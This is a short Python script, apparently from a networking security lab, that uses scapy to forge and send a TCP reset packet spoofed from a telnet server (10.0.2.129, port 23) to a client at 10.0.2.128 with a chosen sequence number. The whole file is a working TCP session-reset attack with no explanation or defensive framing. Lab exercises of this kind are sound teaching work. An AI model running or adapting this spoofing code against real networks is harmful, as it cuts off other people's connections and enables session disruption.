#!/usr/bin/python

from scapy.all import *

ip = IP(src="10.0.2.129", dst="10.0.2.128")
tcp = TCP(sport=23, dport=35216, flags="R", seq=3454855907)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
